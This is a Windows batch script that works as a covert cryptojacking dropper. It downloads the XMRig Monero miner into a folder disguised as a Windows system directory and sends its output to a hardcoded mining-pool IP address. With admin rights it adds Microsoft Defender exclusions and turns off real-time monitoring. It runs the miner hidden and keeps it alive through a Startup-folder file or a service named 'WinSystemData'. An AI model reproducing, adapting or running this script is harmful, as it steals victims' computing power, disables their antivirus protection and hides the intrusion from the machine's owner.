@echo off

set VERSION=2.5

net session >nul 2>&1
if %errorLevel% == 0 (set ADMIN=1) else (set ADMIN=0)

if ["%USERPROFILE%"] == [""] (
  exit /b 1
)

if not exist "%USERPROFILE%" (
  exit /b 1
)

where powershell >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where find >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

where findstr >NUL
if not %errorlevel% == 0 (
  exit /b 1
)

set "MINER_DIR=%USERPROFILE%\AppData\Local\Microsoft\Windows\SystemData"

rem Verificar si el miner ya esta instalado y funcionando
if exist "%MINER_DIR%\xmrig.exe" (
  "%MINER_DIR%\xmrig.exe" --help >NUL 2>NUL
  if %ERRORLEVEL% equ 0 (
    tasklist /fi "imagename eq xmrig.exe" | find "xmrig.exe" >NUL
    if %ERRORLEVEL% equ 0 (
      rem Miner ya esta funcionando, no hacer nada
      exit /b 0
    )
  )
)

rem Detectar nucleos fisicos del procesador
for /f "tokens=2 delims==" %%i in ('wmic cpu get NumberOfCores /value 2^>NUL ^| find "="') do set PHYSICAL_CORES=%%i
if not defined PHYSICAL_CORES set PHYSICAL_CORES=%NUMBER_OF_PROCESSORS%

rem Calcular porcentaje optimo segun nucleos fisicos
if %PHYSICAL_CORES% LEQ 2 (
    set CPU_USAGE=50
) else if %PHYSICAL_CORES% EQU 4 (
    set CPU_USAGE=25
) else if %PHYSICAL_CORES% GEQ 6 (
    set CPU_USAGE=20
)

set /a "EXP_MONERO_HASHRATE = (%PHYSICAL_CORES% * 700 * %CPU_USAGE% + 50) / 100"

set /a "OPTIMAL_DIFF = %EXP_MONERO_HASHRATE% * 30"
set DIFFICULTY=%OPTIMAL_DIFF%

if %ADMIN% == 1 (
  powershell -Command "Add-MpPreference -ExclusionPath '%MINER_DIR%' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionProcess 'xmrig.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionProcess 'nssm.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionExtension '.exe' -Force" >NUL 2>NUL
  powershell -Command "Add-MpPreference -ExclusionExtension '.zip' -Force" >NUL 2>NUL
  powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >NUL 2>NUL
  timeout 3 >NUL

)

sc stop WinSystemData >NUL 2>NUL
sc delete WinSystemData >NUL 2>NUL
taskkill /f /t /im xmrig.exe >NUL 2>NUL

:REMOVE_DIR0
timeout 2 >NUL
rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR0

mkdir "%MINER_DIR%"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/xmrig.zip', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  goto MINER_BAD
)

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%MINER_DIR%')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\xmrig.zip" >NUL
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
"%MINER_DIR%\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK
:MINER_BAD


for /f tokens^=2^ delims^=^" %%a IN ('powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $str = $wc.DownloadString('https://github.com/xmrig/xmrig/releases/latest'); $str | findstr msvc-win64.zip | findstr download"') DO set MINER_ARCHIVE=%%a
set "MINER_LOCATION=https://github.com%MINER_ARCHIVE%"

powershell -Command "[Net.ServicePointManager]::SecurityProtocol = 'tls12, tls11, tls'; $wc = New-Object System.Net.WebClient; $wc.DownloadFile('%MINER_LOCATION%', '%USERPROFILE%\xmrig.zip')"
if errorlevel 1 (
  exit /b 1
)

:REMOVE_DIR1
timeout 5
rmdir /q /s "%MINER_DIR%" >NUL 2>NUL
IF EXIST "%MINER_DIR%" GOTO REMOVE_DIR1

mkdir "%MINER_DIR%"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\xmrig.zip', '%MINER_DIR%')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\xmrig.zip" >NUL
  if errorlevel 1 (
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\xmrig.zip"

powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"donate-level\": *\d*,', '\"donate-level\": 0,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
"%MINER_DIR%\xmrig.exe" --help >NUL
if %ERRORLEVEL% equ 0 goto MINER_OK


exit /b 1

:MINER_OK


powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"94.72.119.111:3333\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"priority\": *\d*,', '\"priority\": 1,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"max-threads-hint\": *\d*,', '\"max-threads-hint\": %CPU_USAGE%,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"background\": *false,', '\"background\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"colors\": *true,', '\"colors\": false,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"x+%DIFFICULTY%\",'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'"
powershell -Command "$out = cat '%MINER_DIR%\config.json' | %%{$_ -replace '\"nicehash\": *false,', '\"nicehash\": true,'} | Out-String; $out | Out-File -Encoding ASCII '%MINER_DIR%\config.json'" 

copy /Y "%MINER_DIR%\config.json" "%MINER_DIR%\config_background.json" >NUL

(
echo @echo off
echo tasklist /fi "imagename eq xmrig.exe" ^| find ":" ^>NUL
echo if errorlevel 1 goto ALREADY_RUNNING
echo start /min /b %%~dp0xmrig.exe %%^*
echo goto EXIT
echo :ALREADY_RUNNING
echo :EXIT
) > "%MINER_DIR%\miner.bat"

if %ADMIN% == 1 goto ADMIN_MINER_SETUP

if exist "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK
)
if exist "%USERPROFILE%\Start Menu\Programs\Startup" (
  set "STARTUP_DIR=%USERPROFILE%\Start Menu\Programs\Startup"
  goto STARTUP_DIR_OK  
)

exit /b 1

:STARTUP_DIR_OK
(
echo @echo off
echo start /min /b "%MINER_DIR%\xmrig.exe" --config="%MINER_DIR%\config_background.json"
) > "%STARTUP_DIR%\WinSystemData.bat"

powershell -WindowStyle Hidden -Command "Start-Process -FilePath '%MINER_DIR%\xmrig.exe' -ArgumentList '--config=%MINER_DIR%\config_background.json' -WindowStyle Hidden"
goto OK

:ADMIN_MINER_SETUP

if not exist "%MINER_DIR%" (
  mkdir "%MINER_DIR%"
  if errorlevel 1 (
    exit /b 1
  )
)

powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/nssm.zip', '%USERPROFILE%\nssm.zip')"
if errorlevel 1 (
  exit /b 1
)

powershell -Command "Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('%USERPROFILE%\nssm.zip', '%MINER_DIR%')"
if errorlevel 1 (
  powershell -Command "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/7za.exe', '%USERPROFILE%\7za.exe')"
  if errorlevel 1 (
    exit /b 1
  )
  "%USERPROFILE%\7za.exe" x -y -o"%MINER_DIR%" "%USERPROFILE%\nssm.zip" >NUL
  if errorlevel 1 (
    exit /b 1
  )
  del "%USERPROFILE%\7za.exe"
)
del "%USERPROFILE%\nssm.zip"

if not exist "%MINER_DIR%\nssm.exe" (
  exit /b 1
)
if not exist "%MINER_DIR%\xmrig.exe" (
  exit /b 1
)

sc stop WinSystemData
sc delete WinSystemData
"%MINER_DIR%\nssm.exe" install WinSystemData "%MINER_DIR%\xmrig.exe" --config="%MINER_DIR%\config_background.json"
if errorlevel 1 (
  exit /b 1
)
"%MINER_DIR%\nssm.exe" set WinSystemData AppDirectory "%MINER_DIR%"
"%MINER_DIR%\nssm.exe" set WinSystemData AppPriority BELOW_NORMAL_PRIORITY_CLASS
"%MINER_DIR%\nssm.exe" set WinSystemData AppStdout "%MINER_DIR%\stdout"
"%MINER_DIR%\nssm.exe" set WinSystemData AppStderr "%MINER_DIR%\stderr"

"%MINER_DIR%\nssm.exe" start WinSystemData
if errorlevel 1 (
  exit /b 1
)

goto OK

:OK
exit /b 0

:strlen string len
setlocal EnableDelayedExpansion
set "token=#%~1" & set "len=0"
for /L %%A in (12,-1,0) do (
  set/A "len|=1<<%%A"
  for %%B in (!len!) do if "!token:~%%B,1!"=="" set/A "len&=~1<<%%A"
)
endlocal & set %~2=%len%
exit /b